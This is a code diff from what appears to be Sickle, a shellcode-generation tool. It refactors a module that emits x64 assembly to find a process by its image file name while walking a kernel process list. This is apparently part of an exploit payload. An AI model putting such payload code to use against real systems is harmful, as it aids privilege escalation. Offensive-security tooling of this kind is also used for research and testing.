@@ -6,6 +6,8 @@ import binascii
 from sickle.common.lib.reversing.assembler import Assembler
 from sickle.common.lib.generic.mparser import argument_check
 
+from sickle.common.lib.generic.convert import from_str_to_xwords
+
 class Shellcode():
 
     arch = "x64"
@@ -77,56 +79,29 @@ class Shellcode():
         else:
             process_name = argv_dict["PROCESS"]
 
-        process_name = process_name[:15]
-        len_proc_name = len(process_name)
-        written = len_proc_name
-
-        count = {     "QWORDS": 0x00,     "DWORDS": 0x00,     "WORDS": 0x00,     "BYTES": 0x00 }
-        sizes = { "QWORD_SIZE": 0x08, "DWORD_SIZE": 0x04, "WORD_SIZE": 0x02, "BYTE_SIZE": 0x01 }
-        lists = { "QWORD_LIST": [],   "DWORD_LIST": [],   "WORD_LIST": [],   "BYTE_LIST": [] }
-
-        for (count_type), (size_type) in zip(count.keys(), sizes.keys()):
-            if (written != 0):
-                count[count_type] = math.floor(written/sizes[size_type])
-                written -= (count[count_type] * sizes[size_type])
-
-        total_compared = (count["QWORDS"] * sizes["QWORD_SIZE"]) + \
-            (count["DWORDS"] * sizes["DWORD_SIZE"]) + \
-            (count["WORDS"] * sizes["WORD_SIZE"]) + \
-            (count["BYTES"] * sizes["BYTE_SIZE"])
-
-        if (total_compared != len_proc_name):
-            print(f"Failed to generate check function for {process_name}")
-            exit(-1)
-
-        tmp_proc_name = process_name
-
-        for count_type, size_type, list_type in zip(count.keys(), sizes.keys(), lists.keys()):
-            for i in range(count[count_type]):
-                lists[list_type] += tmp_proc_name[:sizes[size_type]],
-                tmp_proc_name = tmp_proc_name[sizes[size_type]:]
+        lists = from_str_to_xwords(process_name)
 
         src = "\nverifyImageFileName:\n"
         src += "    xor r8, r8\n"
         src += "    mov r8, 0x5a8\n"
         for i in range(len(lists["QWORD_LIST"])):
-            src += "    mov r12, 0x{}\n".format( struct.pack('<Q', int.from_bytes(bytes(lists["QWORD_LIST"][i], 'latin-1'))).hex() )
+            src += "    mov r12, 0x{}\n".format( struct.pack('<Q', lists["QWORD_LIST"][i]).hex() )
             src += "    cmp r12, qword ptr [rax + r8]    ; Compare a QWORD (8 bytes)\n"
             src += "    jne traverseLinkedList\n"
-            src += "    add r8, 0x{}\n".format(sizes["QWORD_SIZE"])
+            src += "    add r8, 0x{}\n".format(8)
 
         for i in range(len(lists["DWORD_LIST"])):
-            src += "    mov r12d, dword ptr 0x{}\n".format( struct.pack('<L', int.from_bytes(bytes(lists["DWORD_LIST"][i], 'latin-1'))).hex() )
+            src += "    mov r12d, dword ptr 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() )
             src += "    cmp r12d, dword ptr [rax + r8]   ; Compare a DWORD (4 bytes)\n"
-            src += "    add r8, 0x{}\n".format(sizes["DWORD_SIZE"])
+            src += "    add r8, 0x{}\n".format(4)
 
         for i in range(len(lists["WORD_LIST"])):
-            src += "    mov r12w, word ptr 0x{}\n".format( struct.pack('<H', int.from_bytes(bytes(lists["WORD_LIST"][i], 'latin-1'))).hex() )
+            src += "    mov r12w, word ptr 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
             src += "    cmp r12w, word ptr [rax + r8]    ; Compare a WORD (2 bytes)\n"
-            src += "    add r8, 0x{}\n".format(sizes["WORD_SIZE"])
+            src += "    add r8, 0x{}\n".format(2)
 
         for i in range(len(lists["BYTE_LIST"])):
-            src += "    cmp byte ptr [rax + r8], {}    ; Compare a BYTE\n".format( hex(ord(lists["BYTE_LIST"][i])) )
+            src += "    cmp byte ptr [rax + r8], {}    ; Compare a BYTE\n".format( hex(lists["BYTE_LIST"][i]) )
 
         return src
 
